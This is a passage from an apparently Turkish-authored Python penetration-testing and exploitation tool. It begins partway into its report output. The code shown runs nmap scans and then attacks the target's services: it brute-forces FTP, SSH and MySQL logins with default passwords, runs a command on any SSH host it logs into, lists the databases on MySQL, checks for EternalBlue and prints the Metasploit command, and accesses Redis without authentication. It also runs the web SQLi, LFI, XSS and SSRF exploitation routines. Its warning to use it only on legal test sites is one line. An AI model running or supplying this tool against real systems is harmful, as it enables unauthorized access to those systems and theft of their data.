        print(f"{Colors.BOLD}Zafiyetler:{Colors.RESET} {len(self.vulnerabilities)}")
        print(f"{Colors.BOLD}Exploit'ler:{Colors.RESET} {len(self.exploited)}\n")
        
        # Technologies
        if self.technologies:
            print(f"{Colors.GREEN}{Colors.BOLD}{'='*80}")
            print(f"                    TESPİT EDİLEN TEKNOLOJİLER")
            print(f"{'='*80}{Colors.RESET}\n")
            for tech, value in self.technologies.items():
                print(f"{Colors.CYAN}{tech:20s}{Colors.RESET} - {Colors.GREEN}{value}{Colors.RESET}")
            print()

        # Security Headers
        if self.security_headers:
            print(f"{Colors.GREEN}{Colors.BOLD}{'='*80}")
            print(f"                    GÜVENLİK BAŞLIĞI ANALİZİ")
            print(f"{'='*80}{Colors.RESET}\n")
            for header, data in self.security_headers.items():
                status_color = Colors.GREEN if data['status'] == 'Present' else Colors.RED
                print(f"{Colors.CYAN}{header:30s}{Colors.RESET} - {status_color}{data['status']}{Colors.RESET}")
            print()

        # Port scan results
        if self.open_ports:
            print(f"{Colors.GREEN}{Colors.BOLD}{'='*80}")
            print(f"                    AÇIK PORTLAR VE SERVİSLER")
            print(f"{'='*80}{Colors.RESET}\n")
            
            for port in sorted(self.open_ports):
                service_info = self.services.get(port, {})
                service = service_info.get('service', 'unknown')
                version = service_info.get('version', 'unknown')
                print(f"{Colors.CYAN}Port {port:5d}{Colors.RESET} - {Colors.GREEN}{service:15s}{Colors.RESET} - {version}")
        
        # Exploits
        if self.exploited:
            print(f"\n{Colors.RED}{Colors.BOLD}{'='*80}")
            print(f"                    BAŞARILI EXPLOITATION'LAR")
            print(f"{'='*80}{Colors.RESET}\n")
            
            for i, exploit in enumerate(self.exploited, 1):
                print(f"{Colors.MAGENTA}[{i}] {exploit['type']} - {exploit['method']}{Colors.RESET}")
                print(f"    Payload: {exploit['payload'][:100]}")
                print(f"    Sonuç: {exploit['result'][:200]}\n")
        
        # Vulnerabilities
        if self.vulnerabilities:
            print(f"{Colors.YELLOW}{Colors.BOLD}{'='*80}")
            print(f"                    TESPİT EDİLEN ZAFİYETLER")
            print(f"{'='*80}{Colors.RESET}\n")
            
            for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                vulns = [v for v in self.vulnerabilities if v['severity'] == severity]
                if vulns:
                    color = {
                        'CRITICAL': Colors.RED,
                        'HIGH': Colors.MAGENTA,
                        'MEDIUM': Colors.YELLOW,
                        'LOW': Colors.BLUE
                    }[severity]
                    print(f"{color}{Colors.BOLD}[{severity}] - {len(vulns)} zafiyet{Colors.RESET}")
                    for v in vulns:
                        print(f"  • {v['type']}: {v['description']}")
                    print()
        
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")
        
        # JSON export
        if self.vulnerabilities or self.exploited:
            save_report = False
            filename = self.report_filename
            
            if filename:
                save_report = True
            else:
                save = input(f"{Colors.YELLOW}Detaylı raporu JSON olarak kaydetmek ister misiniz? (e/h): {Colors.RESET}").lower()
                if save == 'e':
                    save_report = True
                    filename = f"pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

            if save_report:
                report = {
                    'target': self.target_url,
                    'target_ip': self.target_ip,
                    'technologies': self.technologies,
                    'security_headers': self.security_headers,
                    'open_ports': self.open_ports,
                    'services': self.services,
                    'vulnerabilities': self.vulnerabilities,
                    'exploits': self.exploited,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(report, f, indent=4, ensure_ascii=False)
                print(f"{Colors.GREEN}✓ Rapor kaydedildi: {filename}{Colors.RESET}\n")
    
    def run_full_penetration_test(self):
        print(f"\n{Colors.RED}{Colors.BOLD}{'='*80}")
        print("              PROFESYONEL PENETRASYON TESTİ (V5.0)") # Başlığı güncelledim
        print(f"{'='*80}{Colors.RESET}\n")
        
        # Faz 1: Network Reconnaissance
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 1: Network Reconnaissance (Nmap Scan)", "SCAN")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.run_nmap_scan()
        time.sleep(2)
        
        # Faz 2: Advanced Web Reconnaissance
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 2: Advanced Web Reconnaissance", "INFO")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.detect_technologies()
        self.check_security_headers()
        self.find_sensitive_files()
        self.brute_force_directories()
        urls = self.crawl_site(max_pages=50)
        time.sleep(1)
        
        # Faz 3: Admin Panel & Brute Force
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 3: Admin Panel Discovery & Attack", "INFO")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        admin_panels = self.find_admin_panel()
        if admin_panels:
            self.brute_force_admin(admin_panels)
        time.sleep(1)
        
        # Faz 4: Yüksek Kritiklikli Web Exploitation (SQL, LFI/RCE, XSS)
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 4: CRITICAL WEB EXPLOITATION (SQLi, LFI/RCE, XSS, SSRF)", "EXPLOIT") # Başlık güncellendi
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        
        self.exploit_sql_injection(urls)
        self.exploit_lfi_rce(urls) # YENİ KRİTİK ADIM
        self.exploit_xss(urls)      # YENİ KRİTİK ADIM
        self.exploit_ssrf(urls)     # YENİ KRİTİK ADIM
        time.sleep(1)
        
        # Faz 5: Exploit vulnerable network services
        if self.services:
            print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
            self.log("PHASE 5: ADVANCED Service Exploitation", "INFO")
            print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
            self.exploit_services()
        
        # Generate Final Report
        self.generate_report()
    
    def exploit_services(self):
        """Exploit vulnerable network services"""
        self.log("Açık servislere exploitation denemeleri yapılıyor...", "INFO")
        
        for port, service_info in self.services.items():
            service = service_info.get('service', '').lower()
            version = service_info.get('version', '').lower()
            
            # FTP Exploitation
            if service == 'ftp' or port == 21:
                self.exploit_ftp(port)
            
            # SSH Exploitation
            elif service == 'ssh' or port == 22:
                self.exploit_ssh(port)
            
            # SMB Exploitation
            elif service == 'smb' or port == 445:
                self.exploit_smb(port)
            
            # MySQL Exploitation
            elif service == 'mysql' or port == 3306:
                self.exploit_mysql(port)
            
            # Redis Exploitation
            elif service == 'redis' or port == 6379:
                self.exploit_redis(port)
    
    def exploit_ftp(self, port):
        """Exploit FTP service"""
        self.log(f"FTP servisine saldırı deneniyor (Port {port})...", "INFO")
        
        # Anonymous login attempt
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(self.target_ip, port, timeout=10)
            ftp.login('anonymous', 'anonymous@test.com')
            
            self.log(f"FTP ANONYMOUS LOGIN BAŞARILI! Port {port}", "EXPLOIT")
            self.add_vulnerability("FTP Anonymous Access", "HIGH", f"Anonymous login enabled on port {port}", self.target_url)
            self.add_exploit("FTP", "Anonymous Login", "anonymous/anonymous@test.com", "Access granted")
            
            # List files
            files = ftp.nlst()
            self.log(f"FTP dosyaları: {files[:10]}", "SUCCESS")
            ftp.quit()
            return True
        except:
            pass
        
        # Brute force common credentials
        ftp_creds = [
            ('admin', 'admin'),
            ('ftp', 'ftp'),
            ('root', 'root'),
            ('test', 'test'),
        ]
        
        for username, password in ftp_creds:
            try:
                import ftplib
                ftp = ftplib.FTP()
                ftp.connect(self.target_ip, port, timeout=5)
                ftp.login(username, password)
                
                self.log(f"FTP LOGIN BAŞARILI! {username}/{password}", "EXPLOIT")
                self.add_exploit("FTP", "Weak Credentials", f"{username}/{password}", "Login successful")
                ftp.quit()
                return True
            except:
                continue
        
        return False
    
    def exploit_ssh(self, port):
        """Exploit SSH service"""
        self.log(f"SSH servisine saldırı deneniyor (Port {port})...", "INFO")
        
        ssh_creds = [
            ('root', 'root'),
            ('root', 'toor'),
            ('admin', 'admin'),
            ('ubuntu', 'ubuntu'),
        ]
        
        try:
            import paramiko
            
            for username, password in ssh_creds:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(self.target_ip, port=port, username=username, password=password, timeout=5)
                    
                    self.log(f"SSH LOGIN BAŞARILI! {username}/{password}", "EXPLOIT")
                    self.add_vulnerability("SSH Weak Credentials", "CRITICAL", f"Port {port}", self.target_url)
                    self.add_exploit("SSH", "Weak Credentials", f"{username}/{password}", "Shell access gained")
                    
                    # Execute command
                    stdin, stdout, stderr = ssh.exec_command('id')
                    output = stdout.read().decode()
                    self.log(f"Command output: {output}", "SUCCESS")
                    
                    ssh.close()
                    return True
                except:
                    continue
        except ImportError:
            self.log("paramiko kütüphanesi bulunamadı, SSH exploitation atlanıyor", "WARNING")
        
        return False
    
    def exploit_smb(self, port):
        """Exploit SMB service"""
        self.log(f"SMB servisine saldırı deneniyor (Port {port})...", "INFO")
        
        # Check for EternalBlue vulnerability
        self.log("EternalBlue (MS17-010) zafiyeti kontrol ediliyor...", "INFO")
        
        try:
            result = subprocess.run(
                ['nmap', '-p', str(port), '--script', 'smb-vuln-ms17-010', self.target_ip],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if 'VULNERABLE' in result.stdout:
                self.log("ETERNALBLUE ZAFİYETİ TESPİT EDİLDİ! (MS17-010)", "EXPLOIT")
                self.add_vulnerability("EternalBlue", "CRITICAL", "MS17-010 vulnerable", self.target_url)
                self.add_exploit("SMB", "EternalBlue", "MS17-010", "Target is vulnerable - use Metasploit")
                self.log("Exploit: msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'", "INFO")
                return True
        except:
            pass
        
        return False
    
    def exploit_mysql(self, port):
        """Exploit MySQL service"""
        self.log(f"MySQL servisine saldırı deneniyor (Port {port})...", "INFO")
        
        mysql_creds = [
            ('root', ''),
            ('root', 'root'),
            ('root', 'password'),
            ('admin', 'admin'),
        ]
        
        try:
            import pymysql
            
            for username, password in mysql_creds:
                try:
                    conn = pymysql.connect(
                        host=self.target_ip,
                        port=port,
                        user=username,
                        password=password,
                        connect_timeout=5
                    )
                    
                    self.log(f"MYSQL LOGIN BAŞARILI! {username}/{password}", "EXPLOIT")
                    self.add_vulnerability("MySQL Weak Credentials", "CRITICAL", f"Port {port}", self.target_url)
                    self.add_exploit("MySQL", "Weak Credentials", f"{username}/{password}", "Database access gained")
                    
                    # Extract information
                    cursor = conn.cursor()
                    cursor.execute("SELECT version()")
                    version = cursor.fetchone()[0]
                    self.log(f"MySQL Version: {version}", "SUCCESS")
                    
                    cursor.execute("SHOW DATABASES")
                    databases = cursor.fetchall()
                    self.log(f"Databases: {[db[0] for db in databases]}", "SUCCESS")
                    
                    conn.close()
                    return True
                except:
                    continue
        except ImportError:
            self.log("pymysql kütüphanesi bulunamadı, MySQL exploitation atlanıyor", "WARNING")
        
        return False
    
    def exploit_redis(self, port):
        """Exploit Redis service"""
        self.log(f"Redis servisine saldırı deneniyor (Port {port})...", "INFO")
        
        try:
            import redis
            
            # Try connection without password
            r = redis.Redis(host=self.target_ip, port=port, socket_connect_timeout=5)
            info = r.info()
            
            self.log(f"REDIS UNAUTHENTICATED ACCESS! Port {port}", "EXPLOIT")
            self.add_vulnerability("Redis No Authentication", "CRITICAL", f"Port {port}", self.target_url)
            self.add_exploit("Redis", "No Auth", "No password required", "Full access to Redis")
            
            self.log(f"Redis version: {info.get('redis_version', 'unknown')}", "SUCCESS")
            return True
        except ImportError:
            self.log("redis kütüphanesi bulunamadı, Redis exploitation atlanıyor", "WARNING")
        except:
            pass
        
        return False

def main():
    print_ascii_art()
    
    parser = argparse.ArgumentParser(
        description="Advanced Penetration Testing & Exploitation Framework",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f'''{Colors.YELLOW}Examples:{Colors.RESET}
  {Colors.CYAN}Hızlı Tarama:{Colors.RESET}
    python tarama.py -t http://testphp.vulnweb.com -m 1
  {Colors.CYAN}Normal Tarama (Detaylı):{Colors.RESET}
    python tarama.py -t http://testphp.vulnweb.com -m 2 -v
  {Colors.CYAN}Tam Test ve Raporlama:{Colors.RESET}
    python tarama.py -t http://testphp.vulnweb.com -m 3 -v -g my_report.json
'''
    )
    
    parser.add_argument('-t', '--target', dest='target_url', required=True, help='Hedef URL (örn: http://testphp.vulnweb.com)')
    parser.add_argument('-m', '--mode', choices=['1', '2', '3'], default='1', 
                        help='Tarama Modu:\n'
                             '1: Hızlı Tarama (Web Only)\n'
                             '2: Normal Tarama (Web + Port Scan)\n'
                             '3: Tam Penetrasyon Testi (Full Nmap + Web + Exploitation)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Detaylı çıktı gösterir')
    parser.add_argument('-g', '--generate-report', dest='report_file', help='Çıktı JSON raporunu belirtilen dosyaya kaydeder')

    args = parser.parse_args()

    target_url = args.target_url
    mode = args.mode
    verbose = args.verbose
    report_file = args.report_file

    if not target_url.startswith(('http://', 'https://')):
        print(f"{Colors.RED}[!] Geçerli bir URL girin (http:// veya https:// ile başlamalı){Colors.RESET}")
        return

    print(f"\n{Colors.RED}{Colors.BOLD}{'='*80}")
    print("⚠️  UYARI: Bu araç sadece yasal test sitelerinde kullanılmalıdır!")
    print("⚠️  Örnek: http://testphp.vulnweb.com/")
    print("⚠️  Yetkisiz kullanım yasadışıdır ve cezai yaptırım içerebilir.")
    print(f"{'='*80}{Colors.RESET}\n")
    
    exploiter = AdvancedExploiter(target_url, verbose=verbose, report_filename=report_file)
    
    print(f"\n{Colors.GREEN}[*] Hedef: {target_url}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] IP: {exploiter.target_ip}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] Tarama başlatılıyor...{Colors.RESET}\n")
    
    start_time = time.time()
    
    if mode == "3":
        # Full penetration test
        exploiter.run_full_penetration_test()
    elif mode == "2":
        # Normal scan
        exploiter.python_port_scan()
        time.sleep(1)
        urls = exploiter.crawl_site(max_pages=20)
        exploiter.exploit_sql_injection(urls)
        admin_panels = exploiter.find_admin_panel()
        if admin_panels:
            exploiter.brute_force_admin(admin_panels)
        exploiter.generate_report()
    else:
        # Quick web scan
        urls = exploiter.crawl_site(max_pages=15)
        exploiter.exploit_sql_injection(urls)
        exploiter.find_admin_panel()
        exploiter.generate_report()
    
    end_time = time.time()
    
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] Penetrasyon testi tamamlandı!{Colors.RESET}")
    print(f"{Colors.GREEN}[*] Toplam süre: {end_time - start_time:.2f} saniye{Colors.RESET}")
    print(f"{Colors.GREEN}[*] Açık portlar: {len(exploiter.open_ports)}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] Zafiyetler: {len(exploiter.vulnerabilities)}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] Başarılı exploit'ler: {len(exploiter.exploited)}{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Tarama kullanıcı tarafından durduruldu{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Beklenmeyen bir hata oluştu: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()   
